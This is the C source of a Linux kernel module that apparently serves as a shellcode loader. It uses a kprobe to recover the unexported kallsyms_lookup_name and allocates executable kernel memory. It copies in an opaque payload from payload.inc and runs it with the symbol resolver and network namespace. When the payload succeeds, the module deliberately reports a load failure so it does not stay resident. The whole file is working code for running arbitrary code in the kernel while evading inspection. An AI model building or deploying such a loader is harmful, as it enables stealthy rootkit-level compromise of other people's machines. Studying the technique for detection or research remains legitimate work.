#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <net/net_namespace.h>

#include "payload.inc"


static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};



static long lookupName = 0;
module_param(lookupName, long, 0);

// extern __attribute__((weak)) unsigned long kallsyms_lookup_name(const char *);


unsigned long lookup_name(const char *name) {
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
	//static typeof(lookup_name) *lookup = (void *)kallsyms_lookup_name;
	//if (NULL == lookup)
	//	lookup = (void *)lookupName;
	//return lookup ? lookup(name) : 0;
	return kallsyms_lookup_name(name);
}


int init_module(void) {
	void *mem = NULL;
	void *(*malloc)(long size) = NULL;
	int   (*set_memory_x)(unsigned long, int) = NULL;

	malloc = (void *)lookup_name("module_alloc");
	if (!malloc) {
		pr_info("module_alloc() not found\n");
		goto Error;
	}

	mem = malloc(round_up(payload_len, PAGE_SIZE));
	if (!mem) {
		pr_info("malloc(payload_len) failed\n");
		goto Error;
	}

	set_memory_x = (void *)lookup_name("set_memory_x");
	if (set_memory_x) {
		int numpages = round_up(payload_len, PAGE_SIZE) / PAGE_SIZE;
		set_memory_x((unsigned long)mem, numpages);
	}
	pr_info("memory set executable!\n");
	pr_info("dumping payload!\n");

	print_hex_dump_bytes("payload@", DUMP_PREFIX_OFFSET, payload, payload_len);

	memcpy(mem, payload, payload_len);
	pr_info("memcopy attempted!\n");

	int retval = ((long (*)(void *, void *))mem)(lookup_name, &init_net);
	if (retval == 0) {
		pr_info("payload executed succesfully!\n");
		return -ENOTTY; // success
	} else {
		pr_info("payload failed to execute!\n");
		pr_info("retval: %d\n", retval);
	}

Error:
	if (mem) {
		vfree(mem);
		pr_info("vfree(mem) attempted!\n");
	} else {
		pr_info("mem was NULL!\n");
	}
	return -ESRCH; // failure
}

MODULE_LICENSE("GPL");
